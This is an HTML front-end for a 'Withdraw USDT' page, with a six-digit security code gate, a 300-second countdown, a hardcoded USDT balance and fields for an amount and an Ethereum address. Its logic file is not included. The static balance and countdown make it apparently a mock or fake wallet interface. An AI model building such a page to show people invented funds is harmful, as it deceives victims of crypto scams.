<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Withdraw USDT</title>
    <link rel="stylesheet" href="styles.css"> <!-- 确保文件名大小写正确 -->
</head>
<body>
    <!-- Security Code Page -->
    <div id="security-page" class="container">
        <h1>Enter Security Code</h1>
        <div class="security-code-container">
            <input type="text" maxlength="1" class="security-code-box" id="code1">
            <input type="text" maxlength="1" class="security-code-box" id="code2">
            <input type="text" maxlength="1" class="security-code-box" id="code3">
            <input type="text" maxlength="1" class="security-code-box" id="code4">
            <input type="text" maxlength="1" class="security-code-box" id="code5">
            <input type="text" maxlength="1" class="security-code-box" id="code6">
        </div>
        <button id="submit-code">Confirm</button>
        <p id="error-message" class="error"></p>
    </div>

    <!-- Main Page -->
    <div id="main-page" class="container" style="display: none;">
        <h1 id="countdown">300</h1>
        <div class="usdt-element">
            <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" alt="USDT" class="usdt-icon"> USDT
        </div>
        <div class="balance-display">Balance: <span id="usdt-balance">267,108.2093</span> USDT</div>
        <input type="text" id="usdt-amount" placeholder="Enter USDT Amount" class="amount-input">
        <input type="text" id="recipient-address" placeholder="Enter Ethereum Address" class="address-input">
        <button id="withdraw-button">Withdraw Now</button>
    </div>

    <script src="app.js"></script> <!-- 确保文件名大小写正确 -->
</body>
</html>
